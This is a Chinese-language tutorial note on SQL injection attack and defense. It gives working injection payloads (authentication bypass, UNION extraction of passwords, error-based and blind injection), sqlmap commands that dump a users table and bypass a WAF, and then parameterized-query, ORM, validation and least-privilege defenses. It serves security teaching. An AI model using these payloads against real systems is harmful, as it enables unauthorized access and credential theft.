# SQL注入攻防

## 核心知识点

### 一、注入原理

#### 1. 基本注入
```sql
-- 正常查询
SELECT * FROM users WHERE username = 'admin' AND password = '123456'

-- 注入攻击
-- 输入: admin' OR '1'='1' --
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = ''
```

#### 2. 联合查询注入
```sql
-- 判断列数
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 

-- 联合查询
' UNION SELECT 1,2,3-- 
' UNION SELECT username,password,3 FROM users-- 
```

#### 3. 报错注入
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- 
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- 
```

### 二、盲注

#### 1. 布尔盲注
```sql
' AND (SELECT substring(username,1,1) FROM users LIMIT 1)='a'-- 
' AND (SELECT ascii(substring(username,1,1)) FROM users LIMIT 1)>96-- 
```

#### 2. 时间盲注
```sql
' AND IF((SELECT substring(username,1,1) FROM users LIMIT 1)='a',SLEEP(5),0)-- 
' AND IF(ascii(substring(database(),1,1))>96,SLEEP(5),0)-- 
```

### 三、SQLMap工具

```bash
# 基本检测
sqlmap -u "http://example.com/page?id=1"

# 指定参数
sqlmap -u "http://example.com/page?id=1" -p id

# POST请求
sqlmap -u "http://example.com/login" --data="username=admin&password=123"

# 获取数据库
sqlmap -u "http://example.com/page?id=1" --dbs

# 获取表
sqlmap -u "http://example.com/page?id=1" -D mydb --tables

# 获取数据
sqlmap -u "http://example.com/page?id=1" -D mydb -T users --dump

# 绕过WAF
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,between
```

### 四、防御方案

#### 1. 参数化查询（预处理语句）
```python
# Python - 正确做法
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# 错误做法（字符串拼接）
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
```

```php
// PHP - PDO预处理
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
$stmt->execute([':email' => $email]);
```

```java
// Java - PreparedStatement
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);
```

#### 2. ORM安全
```python
# Django ORM - 自动防注入
User.objects.filter(username=username)

# SQLAlchemy
session.query(User).filter(User.username == username).first()
```

#### 3. 输入验证
```python
import re

def validate_input(value):
    # 白名单验证
    if not re.match(r'^[a-zA-Z0-9_]+$', value):
        raise ValueError("Invalid input")
    return value
```

#### 4. 最小权限原则
```sql
-- 应用数据库用户只授予必要权限
GRANT SELECT, INSERT, UPDATE ON mydb.users TO 'app_user'@'localhost';
-- 不要使用root用户连接数据库
```
